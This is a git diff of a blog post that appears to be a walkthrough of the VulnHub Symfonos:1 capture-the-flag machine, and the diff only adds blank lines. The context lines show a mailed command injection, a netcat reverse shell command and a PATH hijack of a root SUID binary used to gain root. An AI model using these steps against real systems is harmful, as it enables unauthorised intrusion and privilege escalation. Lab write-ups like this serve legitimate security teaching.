@@ -8,6 +8,7 @@ tags:   [VulnHub,vhl]
 ---
 ## Summary
 > Beginner real life based machine designed to teach a interesting way of obtaining a low priv shell as whats given on website 
+
 ***
 
 ## Setup
@@ -16,6 +17,7 @@ IP Address: 192.168.10.129
 
 `sudo vim /etc/hosts`
 192.168.10.129 symfonos.local
+
 ***
 ### Enumeration 
 
@@ -520,12 +522,14 @@ QUIT
 ```
 What essentially we are doing in this is we are mailing helios a command injection to use the webpage for rce 
 ![9c0172b88d7a5197b9a69ad144a6be66.png]({{site.baseurl}}/images/post/9c0172b88d7a5197b9a69ad144a6be66.png)
+
 using `nc -e /bin/sh 192.168.10.129 9001` in browser e parameter we get a shell as helios 
  
 
 # root flag
 running `find / -perm -u=s 2>/dev/null` we find a file `/opt/statuscheck` which executes as root 
 ![90c5275eab251c491ea95f50d5aa4d5a.png]({{site.baseurl}}/images/post/90c5275eab251c491ea95f50d5aa4d5a.png)
+
 When Run this executable curled http://localhost, so in order to exploit this
 we create our own curl script with `/bin/sh` in tmp 
 ```
@@ -536,6 +540,7 @@ export PATH=/tmp:$PATH
 
 now when we run ./statuscheck in opt we get a shell as root and get the root flag 
 ![f3ad8d9229a4820213b13b8f8c5a6f7c.png]({{site.baseurl}}/images/post/f3ad8d9229a4820213b13b8f8c5a6f7c.png)
+
 Location: /root/flag.txt | Flag: 
 ```
 Congrats on rooting symfonos:1!
